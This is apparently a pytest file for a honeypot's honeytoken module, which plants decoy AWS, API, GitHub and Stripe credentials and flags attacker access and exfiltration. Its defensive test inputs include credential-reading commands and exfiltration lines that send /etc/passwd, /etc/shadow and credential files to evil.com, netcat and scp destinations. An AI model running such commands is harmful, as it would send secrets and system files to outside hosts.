"""Tests for the honeytokens module."""

import pytest
import re

from miragepot.honeytokens import (
    Honeytoken,
    HoneytokenAccess,
    SessionHoneytokens,
    TOKEN_TYPE_AWS_ACCESS_KEY,
    TOKEN_TYPE_API_KEY,
    TOKEN_TYPE_PASSWORD,
    TOKEN_TYPE_DATABASE_PASSWORD,
    TOKEN_TYPE_GITHUB_TOKEN,
    TOKEN_TYPE_SLACK_TOKEN,
    TOKEN_TYPE_STRIPE_KEY,
    TOKEN_TYPE_JWT_SECRET,
    generate_session_id,
    generate_aws_access_key,
    generate_aws_secret_key,
    generate_api_key,
    generate_password,
    generate_database_password,
    generate_jwt_secret,
    generate_github_token,
    generate_slack_token,
    generate_stripe_key,
    generate_ssh_private_key_snippet,
    init_honeytokens,
    record_token_access,
    record_exfiltration_attempt,
    check_command_for_token_access,
    check_for_exfiltration,
    get_honeytokens_summary,
    generate_env_file_content,
    generate_passwords_file_content,
    generate_aws_credentials_content,
)


# =============================================================================
# Session ID Tests
# =============================================================================


class TestSessionId:
    """Tests for session ID generation."""

    def test_generates_unique_ids(self):
        """Should generate unique session IDs."""
        ids = [generate_session_id() for _ in range(100)]
        assert len(set(ids)) == 100  # All unique

    def test_correct_format(self):
        """Session IDs should be hex strings."""
        session_id = generate_session_id()
        assert len(session_id) == 16  # 8 bytes = 16 hex chars
        assert all(c in "0123456789abcdef" for c in session_id)


# =============================================================================
# AWS Key Generation Tests
# =============================================================================


class TestAWSKeyGeneration:
    """Tests for AWS key generation."""

    def test_access_key_format(self):
        """AWS access keys should match expected format."""
        key = generate_aws_access_key("test_session")
        assert key.startswith("AKIA")
        assert len(key) == 20  # AKIA + 16 chars
        assert key[4:].isupper() or key[4:].isalnum()

    def test_access_key_reproducible(self):
        """Same session should produce same key."""
        key1 = generate_aws_access_key("test_session_123")
        key2 = generate_aws_access_key("test_session_123")
        assert key1 == key2

    def test_access_key_different_sessions(self):
        """Different sessions should produce different keys."""
        key1 = generate_aws_access_key("session_a")
        key2 = generate_aws_access_key("session_b")
        assert key1 != key2

    def test_secret_key_format(self):
        """AWS secret keys should be 40 characters."""
        key = generate_aws_secret_key("test_session")
        assert len(key) == 40
        # Should be base64-like characters
        assert all(c.isalnum() or c in "+/" for c in key)

    def test_secret_key_reproducible(self):
        """Same session should produce same secret key."""
        key1 = generate_aws_secret_key("test_session_456")
        key2 = generate_aws_secret_key("test_session_456")
        assert key1 == key2


# =============================================================================
# API Key Generation Tests
# =============================================================================


class TestAPIKeyGeneration:
    """Tests for API key generation."""

    def test_internal_api_key_format(self):
        """Internal API keys should have correct prefix."""
        key = generate_api_key("session", "internal")
        assert key.startswith("api_key_")
        assert len(key) >= 40  # api_key_ (8 chars) + 32 chars = 40

    def test_stripe_api_key_format(self):
        """Stripe API keys should have correct prefix."""
        key = generate_api_key("session", "stripe")
        assert key.startswith("sk_live_")

    def test_openai_api_key_format(self):
        """OpenAI API keys should have correct prefix."""
        key = generate_api_key("session", "openai")
        assert key.startswith("sk-")

    def test_sendgrid_api_key_format(self):
        """SendGrid API keys should have correct prefix."""
        key = generate_api_key("session", "sendgrid")
        assert key.startswith("SG.")

    def test_api_key_reproducible(self):
        """Same session and service should produce same key."""
        key1 = generate_api_key("session_x", "stripe")
        key2 = generate_api_key("session_x", "stripe")
        assert key1 == key2

    def test_api_key_different_services(self):
        """Different services should produce different keys."""
        key1 = generate_api_key("session", "stripe")
        key2 = generate_api_key("session", "openai")
        assert key1 != key2


# =============================================================================
# Password Generation Tests
# =============================================================================


class TestPasswordGeneration:
    """Tests for password generation."""

    def test_password_not_empty(self):
        """Passwords should not be empty."""
        password = generate_password("session")
        assert len(password) > 0

    def test_password_has_complexity(self):
        """Passwords should have some complexity."""
        password = generate_password("session")
        # Should have at least letters and numbers
        has_letter = any(c.isalpha() for c in password)
        has_digit = any(c.isdigit() for c in password)
        assert has_letter and has_digit

    def test_password_reproducible(self):
        """Same session and context should produce same password."""
        pass1 = generate_password("session_123", "admin")
        pass2 = generate_password("session_123", "admin")
        assert pass1 == pass2

    def test_password_different_contexts(self):
        """Different contexts should produce different passwords."""
        pass1 = generate_password("session", "admin")
        pass2 = generate_password("session", "user")
        assert pass1 != pass2

    def test_database_password(self):
        """Database password should be generated."""
        password = generate_database_password("session")
        assert len(password) > 0


# =============================================================================
# Token Generation Tests
# =============================================================================


class TestTokenGeneration:
    """Tests for various token generation."""

    def test_jwt_secret_length(self):
        """JWT secrets should be 64 characters."""
        secret = generate_jwt_secret("session")
        assert len(secret) == 64

    def test_github_token_format(self):
        """GitHub tokens should have ghp_ prefix."""
        token = generate_github_token("session")
        assert token.startswith("ghp_")
        assert len(token) == 40  # ghp_ + 36 chars

    def test_slack_token_format(self):
        """Slack tokens should have xoxb- prefix."""
        token = generate_slack_token("session")
        assert token.startswith("xoxb-")
        assert "-" in token[5:]  # Has dashes in the suffix

    def test_stripe_live_key(self):
        """Stripe live keys should have sk_live_ prefix."""
        key = generate_stripe_key("session", live=True)
        assert key.startswith("sk_live_")

    def test_stripe_test_key(self):
        """Stripe test keys should have sk_test_ prefix."""
        key = generate_stripe_key("session", live=False)
        assert key.startswith("sk_test_")

    def test_ssh_key_snippet_format(self):
        """SSH key snippets should have correct format."""
        snippet = generate_ssh_private_key_snippet("session")
        assert "-----BEGIN OPENSSH PRIVATE KEY-----" in snippet
        assert "-----END OPENSSH PRIVATE KEY-----" in snippet
        assert "truncated" in snippet.lower()


# =============================================================================
# Session Honeytokens Tests
# =============================================================================


class TestSessionHoneytokens:
    """Tests for SessionHoneytokens initialization."""

    def test_init_creates_tokens(self):
        """init_honeytokens should create multiple tokens."""
        honeytokens = init_honeytokens("test_session")
        assert len(honeytokens.tokens) >= 5  # At least 5 token types

    def test_init_creates_aws_tokens(self):
        """Should create AWS credential tokens."""
        honeytokens = init_honeytokens("test_session")
        assert "aws_creds" in honeytokens.tokens
        assert honeytokens.tokens["aws_creds"].token_type == TOKEN_TYPE_AWS_ACCESS_KEY

    def test_init_creates_api_tokens(self):
        """Should create API key tokens."""
        honeytokens = init_honeytokens("test_session")
        assert "internal_api" in honeytokens.tokens
        assert honeytokens.tokens["internal_api"].token_type == TOKEN_TYPE_API_KEY

    def test_init_creates_password_tokens(self):
        """Should create password tokens."""
        honeytokens = init_honeytokens("test_session")
        assert "admin_password" in honeytokens.tokens
        assert "db_password" in honeytokens.tokens

    def test_init_creates_github_token(self):
        """Should create GitHub token."""
        honeytokens = init_honeytokens("test_session")
        assert "github_token" in honeytokens.tokens
        assert honeytokens.tokens["github_token"].token_type == TOKEN_TYPE_GITHUB_TOKEN

    def test_tokens_have_locations(self):
        """All tokens should have file locations."""
        honeytokens = init_honeytokens("test_session")
        for token_id, token in honeytokens.tokens.items():
            assert token.location.startswith("/"), f"{token_id} has invalid location"

    def test_to_dict(self):
        """to_dict should serialize properly."""
        honeytokens = init_honeytokens("test_session")
        data = honeytokens.to_dict()

        assert "session_id" in data
        assert "tokens" in data
        assert "accesses" in data
        assert "total_tokens" in data


# =============================================================================
# Token Access Recording Tests
# =============================================================================


class TestTokenAccessRecording:
    """Tests for recording token accesses."""

    def test_record_access(self):
        """record_token_access should add access record."""
        honeytokens = init_honeytokens("test_session")
        record_token_access(
            honeytokens, "aws_creds", "cat /root/.aws/credentials", "read"
        )

        assert len(honeytokens.accesses) == 1
        assert honeytokens.accesses[0].token_id == "aws_creds"
        assert honeytokens.accesses[0].context == "read"

    def test_record_access_updates_token(self):
        """Recording access should update token access count."""
        honeytokens = init_honeytokens("test_session")
        record_token_access(
            honeytokens, "aws_creds", "cat /root/.aws/credentials", "read"
        )

        assert honeytokens.tokens["aws_creds"].access_count == 1
        assert honeytokens.tokens["aws_creds"].last_accessed is not None

    def test_multiple_accesses(self):
        """Multiple accesses should be recorded."""
        honeytokens = init_honeytokens("test_session")
        record_token_access(honeytokens, "aws_creds", "cat file", "read")
        record_token_access(honeytokens, "aws_creds", "grep AWS file", "read")
        record_token_access(honeytokens, "admin_password", "cat passwords.txt", "read")

        assert len(honeytokens.accesses) == 3
        assert honeytokens.tokens["aws_creds"].access_count == 2

    def test_record_nonexistent_token(self):
        """Recording access to nonexistent token should be ignored."""
        honeytokens = init_honeytokens("test_session")
        record_token_access(honeytokens, "nonexistent", "cat file", "read")

        assert len(honeytokens.accesses) == 0


# =============================================================================
# Exfiltration Recording Tests
# =============================================================================


class TestExfiltrationRecording:
    """Tests for recording exfiltration attempts."""

    def test_record_exfiltration(self):
        """record_exfiltration_attempt should add record."""
        honeytokens = init_honeytokens("test_session")
        record_exfiltration_attempt(
            honeytokens,
            ["aws_creds", "admin_password"],
            "curl -d @creds.txt http://evil.com",
            "http://evil.com",
        )

        assert len(honeytokens.exfiltration_attempts) == 1
        assert honeytokens.exfiltration_attempts[0]["destination"] == "http://evil.com"

    def test_exfiltration_records_accesses(self):
        """Exfiltration should also record as access with exfiltrate context."""
        honeytokens = init_honeytokens("test_session")
        record_exfiltration_attempt(
            honeytokens,
            ["aws_creds"],
            "curl -d @creds.txt http://evil.com",
            "http://evil.com",
        )

        assert len(honeytokens.accesses) == 1
        assert honeytokens.accesses[0].context == "exfiltrate"


# =============================================================================
# Command Access Detection Tests
# =============================================================================


class TestCommandAccessDetection:
    """Tests for detecting token access from commands."""

    def test_detect_file_cat(self):
        """Should detect cat on token file."""
        honeytokens = init_honeytokens("test_session")
        accessed = check_command_for_token_access(
            "cat /root/.aws/credentials",
            honeytokens,
        )
        assert "aws_creds" in accessed

    def test_detect_file_grep(self):
        """Should detect grep on token file."""
        honeytokens = init_honeytokens("test_session")
        accessed = check_command_for_token_access(
            "grep AWS /root/.aws/credentials",
            honeytokens,
        )
        assert "aws_creds" in accessed

    def test_detect_env_file(self):
        """Should detect access to .env file."""
        honeytokens = init_honeytokens("test_session")
        accessed = check_command_for_token_access(
            "cat /var/www/html/.env",
            honeytokens,
        )
        # .env contains multiple tokens
        assert len(accessed) >= 1

    def test_detect_by_filename(self):
        """Should detect access by filename match."""
        honeytokens = init_honeytokens("test_session")
        accessed = check_command_for_token_access(
            "cat .env",  # Just filename, not full path
            honeytokens,
        )
        # Should match .env related tokens
        assert len(accessed) >= 1

    def test_no_false_positives(self):
        """Should not flag unrelated commands."""
        honeytokens = init_honeytokens("test_session")
        accessed = check_command_for_token_access(
            "ls -la /tmp",
            honeytokens,
        )
        assert len(accessed) == 0


# =============================================================================
# Exfiltration Detection Tests
# =============================================================================


class TestExfiltrationDetection:
    """Tests for detecting exfiltration attempts."""

    def test_detect_curl_post(self):
        """Should detect curl POST as exfiltration."""
        honeytokens = init_honeytokens("test_session")
        is_exfil, dest = check_for_exfiltration(
            "curl -d @/etc/passwd http://evil.com/collect",
            honeytokens,
        )
        assert is_exfil is True
        assert "evil.com" in dest

    def test_detect_nc(self):
        """Should detect netcat as exfiltration."""
        honeytokens = init_honeytokens("test_session")
        is_exfil, dest = check_for_exfiltration(
            "cat /etc/passwd | nc 192.168.1.100 4444",
            honeytokens,
        )
        assert is_exfil is True
        assert "192.168.1.100" in dest

    def test_detect_scp(self):
        """Should detect scp as exfiltration."""
        honeytokens = init_honeytokens("test_session")
        is_exfil, dest = check_for_exfiltration(
            "scp /etc/shadow user@remote.server.com:/tmp/",
            honeytokens,
        )
        assert is_exfil is True
        assert "user@remote.server.com" in dest

    def test_normal_curl_not_exfil(self):
        """Normal curl GET should not be exfiltration."""
        honeytokens = init_honeytokens("test_session")
        is_exfil, _ = check_for_exfiltration(
            "curl https://example.com/file.txt",
            honeytokens,
        )
        assert is_exfil is False


# =============================================================================
# Summary Tests
# =============================================================================


class TestHoneytokensSummary:
    """Tests for honeytokens summary generation."""

    def test_summary_basic(self):
        """Summary should include basic counts."""
        honeytokens = init_honeytokens("test_session")
        summary = get_honeytokens_summary(honeytokens)

        assert "total_tokens" in summary
        assert "total_accesses" in summary
        assert summary["total_tokens"] >= 5

    def test_summary_with_accesses(self):
        """Summary should reflect accesses."""
        honeytokens = init_honeytokens("test_session")
        record_token_access(honeytokens, "aws_creds", "cat file", "read")
        record_token_access(honeytokens, "admin_password", "cat passwords", "read")

        summary = get_honeytokens_summary(honeytokens)
        assert summary["total_accesses"] == 2
        assert summary["unique_tokens_accessed"] == 2

    def test_summary_high_risk(self):
        """Summary should flag exfiltration as high risk."""
        honeytokens = init_honeytokens("test_session")
        record_exfiltration_attempt(
            honeytokens, ["aws_creds"], "curl ...", "http://evil.com"
        )

        summary = get_honeytokens_summary(honeytokens)
        assert summary["high_risk"] is True
        assert summary["exfiltration_attempts"] == 1


# =============================================================================
# File Content Generation Tests
# =============================================================================


class TestFileContentGeneration:
    """Tests for generating file content with honeytokens."""

    def test_env_file_content(self):
        """Should generate valid .env file content."""
        honeytokens = init_honeytokens("test_session")
        content = generate_env_file_content(honeytokens)

        assert "DB_PASSWORD=" in content
        assert "INTERNAL_API_KEY=" in content
        assert "JWT_SECRET=" in content
        assert "AWS_ACCESS_KEY_ID=" in content

    def test_env_file_has_real_tokens(self):
        """Generated .env should contain actual token values."""
        honeytokens = init_honeytokens("test_session")
        content = generate_env_file_content(honeytokens)

        # Check that actual generated values are in the content
        db_token = honeytokens.tokens.get("db_password")
        if db_token:
            assert db_token.value in content

    def test_passwords_file_content(self):
        """Should generate valid passwords.txt content."""
        honeytokens = init_honeytokens("test_session")
        content = generate_passwords_file_content(honeytokens)

        assert "admin:" in content
        assert "backup:" in content
        assert "CONFIDENTIAL" in content

    def test_aws_credentials_content(self):
        """Should generate valid AWS credentials content."""
        honeytokens = init_honeytokens("test_session")
        content = generate_aws_credentials_content(honeytokens)

        assert "[default]" in content
        assert "aws_access_key_id" in content
        assert "aws_secret_access_key" in content
        assert "AKIA" in content


# =============================================================================
# Dataclass Tests
# =============================================================================


class TestDataclasses:
    """Tests for dataclass serialization."""

    def test_honeytoken_to_dict(self):
        """Honeytoken should serialize to dict."""
        token = Honeytoken(
            token_id="test",
            token_type=TOKEN_TYPE_PASSWORD,
            value="secret123",
            location="/root/file.txt",
            created_time="2024-01-01T00:00:00",
        )
        data = token.to_dict()

        assert data["token_id"] == "test"
        assert data["value"] == "secret123"
        assert data["access_count"] == 0

    def test_access_to_dict(self):
        """HoneytokenAccess should serialize to dict."""
        access = HoneytokenAccess(
            token_id="test",
            token_type=TOKEN_TYPE_PASSWORD,
            access_time="2024-01-01T00:00:00",
            command="cat file",
            context="read",
        )
        data = access.to_dict()

        assert data["token_id"] == "test"
        assert data["command"] == "cat file"

    def test_session_to_dict(self):
        """SessionHoneytokens should serialize completely."""
        honeytokens = init_honeytokens("test_session")
        record_token_access(honeytokens, "aws_creds", "cat file", "read")

        data = honeytokens.to_dict()

        assert "session_id" in data
        assert "tokens" in data
        assert "accesses" in data
        assert len(data["accesses"]) == 1
